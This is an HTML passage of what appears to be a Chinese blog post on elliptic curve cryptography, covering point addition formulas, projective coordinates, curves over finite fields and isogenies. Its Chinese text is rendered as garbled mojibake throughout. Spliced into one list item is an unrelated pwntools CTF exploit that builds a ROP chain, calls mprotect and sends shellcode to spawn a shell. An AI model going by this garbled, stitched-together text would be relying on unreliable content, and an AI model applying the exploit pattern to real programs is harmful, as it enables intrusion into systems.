src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822160748703.png" alt="æƒ…å†µ2"></li><li><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822160818652.png" alt="æƒ…å†µ3"></li><li><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822160906817.png" alt="æƒ…å†µ4"></li></ul><p>$nP:=P+P+\cdots+P$<br>$0P=O,\quad(-n)P=-(nP)$</p><p><strong>ç‚¹Pçš„é˜¶</strong>ï¼š$\text{æ»¡è¶³ }nP=O\text{çš„æœ€å°æ­£æ•´æ•°}n$</p><h3 id="åæ ‡è¡¨ç¤º"><a href="#åæ ‡è¡¨ç¤º" class="headerlink" title="åæ ‡è¡¨ç¤º"></a>åæ ‡è¡¨ç¤º</h3><p>$P=(x_1,y_1),Q=(x_2,y_2)$,åˆ™$P+Q$ æœ‰å››ç§æƒ…å†µ:</p><ol><li>$P\neq Q$ ä¸”$x_1\neq x_2$</li><li>xxxxxxxxxx82 1from pwn import <em>2â€‹3p=process(â€˜./systemâ€™)4elf=ELF(â€˜./systemâ€™)5context.log_level=â€™debugâ€™6â€‹7â€‹8#é™æ€ç¼–è¯‘ï¼ŒIDAæŸ¥çœ‹å³å¯9open_addr = 0x0806D02010read_addr = 0x0806D09011write_addr = 0x0806D10012bss_addr = 0x080EB00013put_addr = 0x0804F7E0  14ret=0x080481b215pop1ret=0x0804846f16pop3ret=0x0806336b17pop2ret=0x0805c50818sh=0x080BE40819mprotect=0x0806DBB020â€‹21#========orw============22# payload = bâ€™Aâ€™ </em> 11223â€‹24# payload += p32(put_addr)25# payload += p32(pop1ret)26# payload += p32(sh)27â€‹28# payload += p32(read_addr)29# payload += p32(pop3ret)30# payload += p32(0)31# payload += p32(bss_addr)32# payload += p32(8)33â€‹34# # open(bss_addr, 0)35# payload += p32(open_addr)36# payload += p32(pop2ret)37# payload += p32(bss_addr)38# payload += p32(0)      39â€‹40# # read(fd, bss_addr, 100)41# payload += p32(read_addr)42# payload += p32(pop3ret)43# payload += p32(3)44# payload += p32(bss_addr)45# payload += p32(100)46â€‹47# # write(1, bss_addr, 100)48# payload += p32(write_addr)49# payload += p32(ret)50# payload += p32(1) 51# payload += p32(bss_addr)52# payload += p32(100)53â€‹54# p.sendline(payload)55# p.sendlineafter(bâ€™/bin/shâ€™,bâ€™/flag\x00â€™)56# p.interactive()57#=======================58â€‹59#========mprotect=======60payload = bâ€™Aâ€™ * 11261payload += p32(mprotect)62payload += p32(pop3ret)63payload += p32(bss_addr)64payload += p32(0x1000)65payload += p32(7)66â€‹67payload += p32(put_addr)68payload += p32(pop1ret)69payload += p32(sh)70â€‹71payload += p32(read_addr)72payload += p32(bss_addr)73payload += p32(0)74payload += p32(bss_addr)75payload += p32(len(asm(shellcraft.sh())))76â€‹77â€‹78p.sendline(payload)79payload2=asm(shellcraft.sh())80p.sendafter(bâ€™/bin/sh\nâ€™,payload2)81p.interactive()82#=======================python</li><li>$P=Q$ä¸”$y_1\neq0$</li><li>$P=Q$ä¸”$y_1=0:P+P=2P=O$</li></ol><script type="math/tex; mode=display">\text{è®¾ }P=(x_1,y_1),Q=(x_2,y_2),\quad\text{ç›´çº¿ }L\text{æ–¹ç¨‹ä¸º }y=\lambda x+c,\text{ åˆ™}\\\lambda=\begin{cases}\dfrac{y_2-y_1}{x_2-x_1},&P\neq Q\text{ ä¸” }x_1\neq x_2\\\dfrac{3x_1^2+a}{2y_1},&P=Q\text{ ä¸” }y_1\neq0(éšå‡½æ•°æ±‚å¯¼ç®—æ–œç‡)\end{cases}</script><script type="math/tex; mode=display">c=y_1-\lambda x_1=\begin{cases}\frac{y_1x_2-y_2x_1}{x_2-x_1},&\quad P\neq Q\text{ ä¸” }x_1\neq x_2\\\frac{-x_1^3+ax_1+2b}{2y_1},&\quad P=Q\text{ ä¸” }y_1\neq0\end{cases}</script><script type="math/tex; mode=display">\begin{gathered}(\lambda x+c)^{2}=x^{3}+ax+b \\f(x)=x^{3}+ax+b-(\lambda x+c)^{2} \\\text{è®¾ }R=(x_3,y_3),\text{åˆ™} \\f(x)=(x-x_{1})(x-x_{2})(x-x_{3}) \\x^3+ax+b-(\lambda x+c)^2=(x-x_1)(x-x_2)(x-x_3)\end{gathered}</script><script type="math/tex; mode=display">\begin{aligned}&x^3-\lambda^2x^2-2\lambda cx+ax+b-c^2\\&=x^3-(x_1+x_2+x_3)x^2+(x_1x_2+x_1x_3+x_2x_3)x-x_1x_2x_3\\&\lambda^2=x_1+x_2+x_3\Longrightarrow x_3=\lambda^2-x_1-x_2\\&y_{3}=\lambda x_{3}+c\end{aligned}</script><script type="math/tex; mode=display">\begin{aligned}P+Q=-R& =(x_3,-y_3)=(\lambda^2-x_1-x_2,-\lambda x_3-c) \\&=\left(\lambda^2-x_1-x_2,-\lambda^3+(x_1+x_2)\lambda-c\right)\end{aligned}</script><h3 id="ç‚¹çš„åŠ æ³•ç®—æ³•"><a href="#ç‚¹çš„åŠ æ³•ç®—æ³•" class="headerlink" title="ç‚¹çš„åŠ æ³•ç®—æ³•"></a>ç‚¹çš„åŠ æ³•ç®—æ³•</h3><p>$P=(x_1,y_1),Q=(x_2,y_2)$,æ¤­åœ†æ›²çº¿ä¸º$x^3+ax+b:$</p><ul><li><p>if  $\left(P\neq Q\mathrm{~and~}x_1=x_2\right)$or$\left(P=Q\mathrm{~and~}y_1=0\right)$</p><p>â€‹        return $O$</p></li><li><p>if  $P\neq Q$ and $x_1\neq x_2$ï¼Œ      $\lambda=\frac{y_2-y_1}{x_2-x_1}\:,\:c=\frac{y_1x_2-y_2x_1}{x_2-x_1}$</p><p>else      $\lambda=\frac{3x_{1}^{2}+a}{2y_{1}},c=\frac{-x_{1}^{3}+ax_{1}+2b}{2y_{1}}$$(å³P=Q$ and $y_1\neq0)$</p></li><li><p>return $(x_3,-y_3)=(\lambda^2-x_1-x_2,-\lambda^3+(x_1+x_2)\lambda-c)$</p></li></ul><p><strong>å®šç†</strong> (PoincarÃ©,çº¦1900å¹´):è®¾$F$æ˜¯åŸŸï¼Œæ¤­åœ†æ›²çº¿æ–¹ç¨‹ä¸º<br>$x^3+ax+b,a,b\in F$,åŠ$E=\begin{Bmatrix}(x,y)&amp;x^3+ax+b\end{Bmatrix}\cup\begin{Bmatrix}0\end{Bmatrix}$<br>è®¾$E(F)={(x,y)\in E\mid x,y\in F}\cup{O}$,åˆ™$E(F)$æ˜¯$E$çš„å­ç¾¤</p><hr><h2 id="æ— ç©·è¿œç‚¹"><a href="#æ— ç©·è¿œç‚¹" class="headerlink" title="æ— ç©·è¿œç‚¹"></a>æ— ç©·è¿œç‚¹</h2><p><strong>ä»¿å°„å¹³é¢</strong>ï¼šä»¿å°„åæ ‡$(x,y)\in A^2(F)$<br><strong>å°„å½±å¹³é¢</strong>ï¼šå°„å½±åæ ‡$(X,Y,Z)\in P^2(F)$<br>$(0,0,0)\notin P^2(F)$<br><strong>è½¬æ¢å…¬å¼</strong>ï¼š$x=\frac{X}{Z},y=\frac{Y}{Z}$</p><blockquote><p>ä¾‹ï¼šä»¿å°„åæ ‡<script type="math/tex">(x,y)=(3,2)</script><br>å°„å½±åæ ‡<script type="math/tex">(X{:}Y{:}Z)=(3{:}2{:}1)</script>ï¼ˆX,Y,Zï¼‰=(3Z,2Z,Z)</p></blockquote><p><strong>ä»¿å°„ç‚¹</strong>ï¼šåæ ‡å½¢å¼ä¸º$(X:Y:1)$çš„ç‚¹</p><h3 id="æ— ç©·è¿œç‚¹çš„åæ ‡"><a href="#æ— ç©·è¿œç‚¹çš„åæ ‡" class="headerlink" title="æ— ç©·è¿œç‚¹çš„åæ ‡"></a>æ— ç©·è¿œç‚¹çš„åæ ‡</h3><p>$x=\frac X0,y=\frac Y0$</p><p><strong>ä»¿å°„</strong>åæ ‡(æ— æ³•è¡¨ç¤º)$\longleftarrow$<strong>å°„å½±</strong>åæ ‡$(X:Y:0)$</p><h3 id="æ— ç©·è¿œçº¿-line-at-infinity"><a href="#æ— ç©·è¿œçº¿-line-at-infinity" class="headerlink" title="æ— ç©·è¿œçº¿(line at infinity)"></a>æ— ç©·è¿œçº¿(line at infinity)</h3><p>æ— ç©·è¿œç‚¹$(X:Y:0)$<br>æ— ç©·è¿œçº¿ï¼š$(X:1:0)$å’Œ$(1:0:0)$å½¢æˆçš„ç›´çº¿,åµŒåœ¨å°„å½±å¹³é¢ç”¨$P^1(F)$è¡¨ç¤º</p><hr><h2 id="æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿"><a href="#æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿" class="headerlink" title="æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿"></a>æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿</h2><p>$Z_p:$ æ¤­åœ†æ›²çº¿å¯†ç å¸¸ç”¨çš„æœ‰é™åŸŸ $(p&gt;3$æ˜¯ç´ æ•°)</p><script type="math/tex; mode=display">F_p\cong Z_p</script><p>å®šä¹‰åœ¨$F_p$ä¸Šçš„æ¤­åœ†æ›²çº¿(åæ ‡è¿ç®—éƒ½æ˜¯æ¨¡$p$çš„)</p><p>æ–¹ç¨‹ï¼š$y^2\equiv x^3+ax+b\pmod p$),å…¶ä¸­$a,b\in F_p$æ˜¯å¸¸æ•°</p><p>æ»¡è¶³ï¼š$\Delta=4a^3+27b^2\not\equiv0\pmod p$ã€‚</p><p>ç‚¹ï¼š$(x,y)\in F_p\times F_p$<br>ç¾¤ï¼š$E(F_p)$</p><p>$y^2\equiv x^3+ax+b\pmod p$</p><p>$|E(F_p)|\leq2p+1(\text{æ¯ä¸ª}x\text{å¯¹åº”ä¸¤ä¸ª}y\text{,è€Œ}x\text{çš„å–å€¼ä¸è¶…è¿‡}p\text{ä¸ª},æ­¤å¤„åŠ ä¸Šæ— ç©·è¿œç‚¹)$</p><p><strong>å®šç† (Hasse,1933)</strong>: $p+1-2\sqrt{p}\leq\left|E(F_p)\right|\leq p+1+2\sqrt{p}$<br><strong>Schoof ç®—æ³•</strong>ï¼šè®¡ç®— $|E(F_p)|$çš„å¤§å°<br>(æ—¶é—´å¤æ‚åº¦ï¼š$O((logp)^8)$ä¸ªæ¯”ç‰¹è¿ç®—å’Œ$\mathcal{O}((logp)^6)$ä¸ª$\mathbb{Z}_p$ä¸­è¿ç®—)</p><p><strong>å®šç†</strong>ï¼š$E(F_p)$æ˜¯å¾ªç¯ç¾¤æˆ–åŒæ„äºä¸¤ä¸ªå¾ªç¯ç¾¤çš„ç¬›å¡å°”ä¹˜ç§¯$(p&gt;3)$<br>$E(F_p)\cong Z_{n_2}\times Z_{n_1}$</p><p>$E(F_p)\cong Z_{n_2}\times Z_{n_1}$<br>$n_2\mid n_1,n_2\mid(p-1)$</p><p><strong>å®šç†</strong>:$|E(F_p)|$æ˜¯ç´ æ•°æˆ–ä¸¤ä¸ªä¸åŒç´ æ•°ä¹˜ç§¯,åˆ™$E(F_p)$æ˜¯å¾ªç¯ç¾¤$(p&gt;3)$</p><hr><h2 id="ç‚¹å‹ç¼©-point-compress"><a href="#ç‚¹å‹ç¼©-point-compress" class="headerlink" title="ç‚¹å‹ç¼©(point compress)"></a>ç‚¹å‹ç¼©(point compress)</h2><p>$(x,y)è½¬ä¸ºå­˜å‚¨(x,y\ mod\ 2),å³yæ˜¯å¥‡æ•°å­˜å‚¨(x,1),yæ˜¯å¶æ•°å­˜å‚¨(x,0),yæ˜¯å¶æ•°$</p><h3 id="ç‚¹è§£å‹-point-decompress"><a href="#ç‚¹è§£å‹-point-decompress" class="headerlink" title="ç‚¹è§£å‹(point decompress)"></a>ç‚¹è§£å‹(point decompress)</h3><p>$(x,y\ mod\ 2)$<br>$y^2=x^3+ax+b\ mod\ p$<br>$y=\pm\sqrt{x^3+ax+b}\:mod\:p\longrightarrow y_1=yï¼Œy_2=p-y$</p><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822184615584.png" alt="ç‚¹å‹ç¼©ä¸ç‚¹è§£å‹"></p><hr><h2 id="åŒæº-isogeny"><a href="#åŒæº-isogeny" class="headerlink" title="åŒæº(isogeny)"></a>åŒæº(isogeny)</h2><p>æ¤­åœ†æ›²çº¿çš„ç»“æ„ç‰¹ç‚¹</p><ul><li>å‡ ä½•ç»“æ„(å…‰æ»‘å°„å½±æ›²çº¿)</li><li>ä»£æ•°ç»“æ„(ç‚¹ç¾¤$E$)</li></ul><p><strong>åŒæº</strong>æ˜¯ä¸€ç§ä¿æŒæ¤­åœ†æ›²çº¿ç»“æ„çš„æ˜ å°„</p><script type="math/tex; mode=display">\text{åŒæº }\phi{:}E(K)\to E^{\prime}(K)\text{ æ˜¯ä¸ªç¾¤åŒæ€(æ»¡åŒæ€)(}K\text{æ˜¯åŸŸ)}</script><ul><li>$\phi(O)=O^{\prime}$</li></ul><p><strong>è‡ªåŒæ€ (endomorphism)</strong>: æ¤­åœ†æ›²çº¿åˆ°è‡ªèº«çš„åŒæº<br><strong>è‡ªåŒæ„ (automorphism)</strong>: åŒæºæ˜¯è‡ªåŒæ€ï¼Œä¹Ÿæ˜¯åŒæ„</p><p><strong>æ³¨æ„</strong>ï¼šè‡ªåŒæ€æœªå¿…æ˜¯åŒæºï¼Œæ¯”å¦‚ï¼š$\forall P\in E(K),\phi(P)=O$ ,æ˜¯è‡ªåŒæ€ï¼Œä½†ä¸æ˜¯åŒæº(å› ä¸ºä¸æ˜¯æ»¡åŒæ€)</p><blockquote><p>ä¾‹ï¼š$\phi{:}E(K)\to E(K)$ï¼Œè®°$\phi:=[n]$<br>$P\mapsto nP$<br>è‡ªåŒæ€ $(n=0$æ—¶ä¸æ˜¯åŒæº)<br>$n\neq0:$åŒæº<br>$n=\pm1:$è‡ªåŒæ„</p><p>å¯¹äºå¤§å¤šæ•°æ¤­åœ†æ›²çº¿ï¼Œå”¯ä¸€çš„è‡ªåŒæ€å°±æ˜¯è¿™ç§å½¢å¼çš„åŒæº</p></blockquote><h3 id="åŒæºçš„æ ‡å‡†å½¢å¼"><a href="#åŒæºçš„æ ‡å‡†å½¢å¼" class="headerlink" title="åŒæºçš„æ ‡å‡†å½¢å¼"></a>åŒæºçš„æ ‡å‡†å½¢å¼</h3><p>è®¾ $\phi{:}E(K)\to E^{\prime}(K)$ æ˜¯åŒæº $(K$æ˜¯åŸŸ),ç‚¹$P=(x,y)\in E(K)$,<br>åˆ™ä»¿å°„åæ ‡ä¸‹ï¼Œ$\phi$å…·æœ‰ä»¥ä¸‹æ ‡å‡†å½¢å¼(standard form):</p><script type="math/tex; mode=display">\phi(x,y)=(\frac{u(x)}{v(x)},\frac{s(x)}{t(x)}y)</script><p>å…¶ä¸­$u(x),v(x),s(x),t(x)\in K[X],u(x),v(x)$äº’ç´ ï¼Œ$s(x),t(x)$äº’ç´ ã€‚</p><p><strong>æ¨è®º</strong>ï¼šè®¾$E(K)$ çš„æ–¹ç¨‹ä¸º $y^2= x^3+ ax+ b$, $f( x) = x^3+ ax+b$,åˆ™ï¼š<br>$v^3(x)\mid t^2(x)$<br>$t^2(x)\mid v^3(x)f(x)$<br>åŒæº$\phi{:}E(K)\to E^{\prime}(K)$æ˜¯åŒæº (Kæ˜¯åŸŸ)<br>$\phi(x,y)=(\frac{u(x)}{v(x)},\frac{s(x)}{t(x)}y)$</p><h3 id="å¼—ç½—è´å°¼ä¹Œæ–¯è‡ªåŒæ€-Frobenius-endomorphism"><a href="#å¼—ç½—è´å°¼ä¹Œæ–¯è‡ªåŒæ€-Frobenius-endomorphism" class="headerlink" title="å¼—ç½—è´å°¼ä¹Œæ–¯è‡ªåŒæ€(Frobenius endomorphism)"></a>å¼—ç½—è´å°¼ä¹Œæ–¯è‡ªåŒæ€(Frobenius endomorphism)</h3><p>$\pi{:}E(F_q)\to E(F_q)$<br>$(X{:}Y{:}Z)\mapsto(X^q:Y^q:Z^q)$</p><p>$E(F_q)$çš„æ–¹ç¨‹$y^2=x^3+ax+b,a,b\in F_q,(x,y)\in F_q^2$<br>$\pi(x,y)=(x^q,\:(x^3+ax+b)^{\frac{q-1}2}y)$</p><p>$u(x)=x^qï¼Œv(x)=eï¼Œs(x)=(x^3+ax+b)^{\frac{q-1}2}ï¼Œt(x)=e$</p><blockquote><p>æ³¨ï¼šè‹¥$F_q$çš„ç‰¹å¾æ˜¯ç´ æ•°$p$<br>$\boldsymbol{\pi}^{\prime}:E(F_q)\to E^{\prime}(F_q)$<br>$(X{:}Y{:}Z)\mapsto(X^p{:}Y^p{:}Z^p)$<br>åŒæº(æœªå¿…æ˜¯è‡ªåŒæ€)</p></blockquote><p><strong>å®šç† (Sato-Tateå®šç†)</strong>ï¼š$\left|E(F_q)\right|=\left|E^{\prime}(F_q)\right|,å½“ä¸”ä»…å½“,è¿™ä¸¤ä¸ªæ¤­åœ†æ›²çº¿åŒæºã€‚$</p><h3 id="åŒæºçš„åº¦-degree-of-isogeny"><a href="#åŒæºçš„åº¦-degree-of-isogeny" class="headerlink" title="åŒæºçš„åº¦(degree of isogeny)"></a>åŒæºçš„åº¦(degree of isogeny)</h3><p>å®šä¹‰(åŒæºçš„åº¦): $\phi(x,y)=(\frac {u(x)}{v(x)},\frac{s(x)}{t(x)}y)$æ˜¯æ ‡å‡†å½¢å¼ï¼ŒåŒæº$\phi$çš„åº¦æ˜¯<br>$deg(\phi):=\max(deg(u(x)),deg(v(x)))ã€‚$</p><h3 id="åŒæºçš„å¯åˆ†æ€§-separability"><a href="#åŒæºçš„å¯åˆ†æ€§-separability" class="headerlink" title="åŒæºçš„å¯åˆ†æ€§(separability)"></a>åŒæºçš„å¯åˆ†æ€§(separability)</h3><p><strong>å®šä¹‰(å¯åˆ†æ€§)</strong>: $\phi(x,y)=(\frac {u(x)}{v(x)},\frac{s(x)}{t(x)}y)$æ˜¯æ ‡å‡†å½¢å¼ï¼Œ<br>å¦‚æœ $(\frac{u(x)}{v(x)})^{\prime}\neq\theta$,åˆ™ç§°$\phi$æ˜¯<strong>å¯åˆ†çš„(separable);</strong><br>å¦‚æœ ($\frac{u(x)}{v(x)})^{\prime}=\theta$,åˆ™ç§°$\phi$æ˜¯<strong>ä¸å¯åˆ†çš„ (inseparable)ã€‚</strong></p><h3 id="åŒæºçš„åˆ†è§£"><a href="#åŒæºçš„åˆ†è§£" class="headerlink" title="åŒæºçš„åˆ†è§£"></a>åŒæºçš„åˆ†è§£</h3><p>ä»»ä½•ç‰¹å¾å¤§äº0çš„åŒæºéƒ½å¯ä»¥åˆ†è§£æˆå¯åˆ†åŒæºå’Œä¸å¯åˆ†åŒæºçš„å¤åˆ</p><p><strong>å¼•ç†1</strong>ï¼šåŸŸ$K$çš„ç‰¹å¾æ˜¯$p$ã€‚è®¾å¤šé¡¹å¼ $u(x),v(x)\in K[X]$äº’ç´ ï¼Œåˆ™<br>$(\frac{u(x)}{v(x)})^{\prime}=\theta\Leftrightarrow u^{\prime}(x)=v^{\prime}(x)=\theta$<br>$\Leftrightarrow u(x)=f(x^{p}),v(x)=g(x^{p})\:,$<br>å…¶ä¸­$f(x)$,g$(x)\in K[X]$</p><p><strong>å¼•ç†2</strong>ï¼š$\phi{:}E(K)\to E^{\prime}(K)$æ˜¯ä¸å¯åˆ†åŒæºï¼Œ$K$ çš„ç‰¹å¾æ˜¯$p$ ã€‚åˆ™æ ‡å‡†å½¢å¼ä¸‹ï¼Œæœ‰</p><script type="math/tex; mode=display">\phi(x,y)=\phi(a(x^p),b(x^p)y^p)\:,</script><p>å…¶ä¸­$a(x),b(x)\in K[X]$</p><p><strong>æ€§è´¨</strong>ï¼šåŒæº$\phi{:}E(K)\to E^{\prime}(K)$,$K$çš„ç‰¹å¾æ˜¯$p&gt;0$,åˆ™æœ‰<br>$\phi=\alpha\circ(\pi^{\prime})^n,$<br>å…¶ä¸­ $\alpha$æ˜¯å¯åˆ†åŒæºï¼Œ$\pi^{\prime}$æ˜¯$p$ -power å¼—ç½—è´å°¼ä¹Œæ–¯æ˜ å°„ï¼Œ$n\geq0$ã€‚<br>æ³¨ï¼š$\pi^\prime:(X{:}Y{:}Z)\mapsto(X^p{:}Y^p{:}Z^p)$</p><script type="math/tex; mode=display">\begin{aligned}&&&\bullet\phi æ˜¯å¯åˆ†åŒæ¼”:è®¾n=0,\alpha=\alpha,\phi,åˆ™æ»¡è¶³\phi=\alpha\circ(\pi^{\prime})^{n},\\&&&\bullet\phi æ˜¯ä¸å¯åˆ†åŒæº:æ ¹æ®å¼•ç†2ã€‚æœ‰\phi(x,y)=\phi(a(x^p),b(x^p)y^p)ã€‚\\&&&\text{è®¾ }\alpha_1(x,y):=(a(x),b(x)y),\text{ æœ‰ }\phi=\alpha_1\circ\pi^{\prime}ã€‚\\&&&\text{å¦‚æœ }\alpha_1\text{æ˜¯å¯åˆ†åŒæº,åˆ™æ»¡è¶³ }\phi=\alpha\circ(\pi^{\prime})^n\quad(n=1,\alpha:=\alpha_1);\\&&&\text{å¦‚æœ }\alpha_1\text{ æ˜¯ä¸å¯åˆ†åŒæº,æ ¹æ®å¼•ç†2, æœ‰}\\&&&\alpha_1(x,y)=\alpha_1(a_1(x^p),b_1(x^p))y^n)ã€‚\\&&&\text{è®¾ }\alpha_2(x,y)=(\alpha_1(x),b_1(x)),\text{ æœ‰ }\alpha_1=\alpha_2\circ\pi^{\prime},\\&&&\text{åˆ™ }\phi(x,y)=\alpha_1\circ\pi^{\prime}=\alpha_2\circ\pi^{\prime}\circ\pi^{\prime}=\alpha_2\circ(\pi^{\prime})^2ã€‚\\&&&\text{ä¾æ­¤ç±»æ¨,æœ‰ }\phi=\alpha_n\circ(\pi^{\prime})^n\text{ã€‚ä»¤}\alpha:=\alpha_n,\text{ æœ‰}\phi=\alpha\circ(\pi^{\prime})^n\text{ã€‚}\end{aligned}</script><h3 id="åº¦çš„åˆ†è§£"><a href="#åº¦çš„åˆ†è§£" class="headerlink" title="åº¦çš„åˆ†è§£"></a>åº¦çš„åˆ†è§£</h3><p><strong>å®šä¹‰(åº¦çš„åˆ†è§£)</strong>:å¯¹äºåŒæºçš„åˆ†è§£ $\phi=\alpha\circ(\pi^{\prime})^n$,è®¾$deg_s\phi$æ˜¯å…¶å¯<br>åˆ†åº¦ (separable degree), $deg_i\phi$æ˜¯å…¶ä¸å¯åˆ†åº¦ (inseparable<br>degree),åˆ™<br>$deg_s\phi:=deg\alpha,\:deg_i\phi:=p^n,$<br>è€Œä¸”æ€»æ˜¯æœ‰<br>$deg\phi=(deg_s\phi)\cdot(deg_i\phi)=deg\ \alpha\cdot p^n$</p><blockquote><p>ä¾‹ï¼š<script type="math/tex">\begin{aligned}&\phi=(\pi^{\prime})^n\\&(\pi^{\prime})^n\text{çš„ç‰¹å¾å¤§äº0,æ˜¯å¯åˆ†è§£çš„ã€‚}\\&\text{è®¾ }(\pi^{\prime})^n=\alpha\circ(\pi^{\prime})^n\text{,åˆ™æœ‰ }\alpha:P\mapsto Pã€‚\\&\text{æ‰€ä»¥,}deg\alpha=1\text{ã€‚æ•…è€Œ,}deg_s\pi^{\prime}=1ã€‚\end{aligned}</script></p></blockquote><p><strong>å®šä¹‰(çº¯ä¸å¯åˆ†åŒæº)</strong>:å¯åˆ†åº¦æ˜¯1çš„åŒæº,å«çº¯ä¸å¯åˆ†çš„(purely inseparable)</p><p><strong>æ€§è´¨</strong>:çº¯ä¸å¯åˆ†åŒæºçš„åº¦å¿…ç„¶æ˜¯$p^n$çš„å½¢å¼(åä¹‹,æœªå¿…æˆç«‹)ã€‚</p><p>$deg\phi=1$ (åŒæ„)æ—¶ï¼Œåˆ™$\phi$å…·æœ‰å¦‚ä¸‹æ€§è´¨ï¼š</p><ul><li>$\phi$æ˜¯å¯åˆ†çš„(å³$(\frac u(x){v(x)})^{\prime}\neq0)$</li><li>$\phi$ä¹Ÿæ˜¯çº¯ä¸å¯åˆ†çš„ (å³$deg_s\not\phi=1)$</li></ul><hr><h2 id="ä»£æ•°é—­åŒ…-algebraic-closure"><a href="#ä»£æ•°é—­åŒ…-algebraic-closure" class="headerlink" title="ä»£æ•°é—­åŒ…(algebraic closure)"></a>ä»£æ•°é—­åŒ…(algebraic closure)</h2><p>åŒæº $\phi{:}E(K)\to E^{\prime}(K)$è¯±å¯¼äº†ä¸€ä¸ª$E(\overline{K})\to E^{\prime}(\overline{K})$çš„ç¾¤åŒæ€ã€‚</p><blockquote><p>ä¾‹ï¼š$E(F_q)$ä¸Šçš„å¼—ç½—è´å°¼ä¹Œæ–¯è‡ªåŒæ€$\pi{:}\left(X{:}Y{:}Z\right)\mapsto\left(X^q{:}Y^q{:}Z^q\right)$,<br>è¯±å¯¼äº†ä¸€ä¸ª$E(\overline{F}_q)\to E^{\prime}(\overline{F}_q)$çš„ç¾¤åŒæ„ã€‚</p></blockquote><hr><h2 id="åŒæºæ ¸-isogeny-kernel"><a href="#åŒæºæ ¸-isogeny-kernel" class="headerlink" title="åŒæºæ ¸(isogeny kernel)"></a>åŒæºæ ¸(isogeny kernel)</h2><p>æœ¬è´¨ä¸Šæ˜¯åŒæºçš„åŒæ€æ ¸</p><h3 id="ç¬¬ä¸€åŒæºæ ¸å®šç†-First-isogeny-kernel-theorem"><a href="#ç¬¬ä¸€åŒæºæ ¸å®šç†-First-isogeny-kernel-theorem" class="headerlink" title="ç¬¬ä¸€åŒæºæ ¸å®šç†(First isogeny-kernel theorem)"></a>ç¬¬ä¸€åŒæºæ ¸å®šç†(First isogeny-kernel theorem)</h3><p><strong>å®šç†</strong>ï¼šåŒæº$\phi=\alpha$ o$(\pi^{\prime})^n$,åˆ™$|\ker\phi|=deg(\alpha)$<br>(åŒæºæ ¸çš„é˜¶ç­‰äºå…¶å¯åˆ†åº¦)</p><p>$|\mathrm{Ker~}\phi|=|\mathrm{Ker~}\alpha|=|S|=deg\left(g\right)=deg\left(\alpha\right)$</p><p>ä¾‹ï¼š$deg(\alpha)=3$,åˆ™$|\ker\phi|=3$</p><h3 id="ç¬¬äºŒåŒæºæ ¸å®šç†-Second-isogeny-kernel-theorem"><a href="#ç¬¬äºŒåŒæºæ ¸å®šç†-Second-isogeny-kernel-theorem" class="headerlink" title="ç¬¬äºŒåŒæºæ ¸å®šç†(Second isogeny-kernel theorem)"></a>ç¬¬äºŒåŒæºæ ¸å®šç†(Second isogeny-kernel theorem)</h3><p><strong>å®šç†</strong>ï¼šè®¾$E(K)$æ˜¯æ¤­åœ†æ›²çº¿ï¼Œ$G$æ˜¯$E(\bar{K})$çš„æœ‰é™å­ç¾¤ï¼Œåˆ™å­˜åœ¨æ¤­åœ†æ›²çº¿$E^\prime$,ä»¥åŠå¯åˆ†åŒæº$\phi:E\to E^{\prime}$,ä½¿å¾— $Ker \phi=G$,ä¸”$E^\prime$å’Œ$\phi$åœ¨åŒæ„æ„ä¹‰ä¸‹æ˜¯å”¯ä¸€çš„ã€‚</p><p><strong>æ¨è®º</strong>:åº¦æ˜¯åˆæ•°çš„åŒæºå¯ä»¥è¢«åˆ†è§£æˆä¸€ç³»åˆ—åº¦æ˜¯ç´ æ•°çš„åŒæºã€‚</p><h2 id="æ¤­åœ†æ›²çº¿çš„è‡ªåŒæ€ç¯"><a href="#æ¤­åœ†æ›²çº¿çš„è‡ªåŒæ€ç¯" class="headerlink" title="æ¤­åœ†æ›²çº¿çš„è‡ªåŒæ€ç¯"></a>æ¤­åœ†æ›²çº¿çš„è‡ªåŒæ€ç¯</h2><h3 id="åŒæ€ç¾¤-groups-of-homomorphisms"><a href="#åŒæ€ç¾¤-groups-of-homomorphisms" class="headerlink" title="åŒæ€ç¾¤(groups of homomorphisms)"></a>åŒæ€ç¾¤(groups of homomorphisms)</h3><p>è®¾æ¤­åœ†æ›²çº¿$E$å’Œ$E^{\prime}$å®šä¹‰åœ¨åŸŸ$K$ä¸Šï¼Œå®šä¹‰é›†åˆ</p><p>$Hom(E,E^{\prime}):={\text{æ‰€æœ‰åŒæº}\alpha{:}E\to E^{\prime}}\cup{[0]}$</p><blockquote><p>$Hom(E,E^{\prime})$ä¸Šçš„åŠ æ³•è¿ç®—ï¼šå¯¹äºä»»æ„ $\alpha,\beta\in Hom(E,E^{\prime})$,ä»»æ„ç‚¹<br>$P\in E(\overline{K}),\alpha+\beta$å®šä¹‰ä¸º$(\alpha+\beta)(P):=\alpha(P)+\beta(P)$</p><p>æ„æˆåŠ æ³•é˜¿è´å°”ç¾¤ï¼ŒåŠ æ³•å•ä½å…ƒï¼š$[0]:P\mapsto 0P(=O)$</p></blockquote><p><strong>å¼•ç†1</strong></p><p>è®¾ $\alpha, \beta \in Hom(E,Eâ€™)$ï¼Œå¯¹äºæ‰€æœ‰ç‚¹ $P \in E(\overline{K})$ï¼Œå¦‚æœ $\alpha(P) = \beta(P)$ï¼Œåˆ™ $\alpha = \beta$</p><p><strong>å¼•ç†2</strong></p><p>å¯¹äºæ‰€æœ‰ $n \in Z$ å’Œ $\alpha \in Hom(E,Eâ€™)$ï¼Œæœ‰ $[n] \circ \alpha = n\alpha = \alpha \circ [n].$</p><h4 id="åˆ†é…å¾‹"><a href="#åˆ†é…å¾‹" class="headerlink" title="åˆ†é…å¾‹"></a>åˆ†é…å¾‹</h4><p>å¯¹äº$\alpha,\beta\in Ho\boldsymbol{m}(E,E^{\prime}),\phi\in 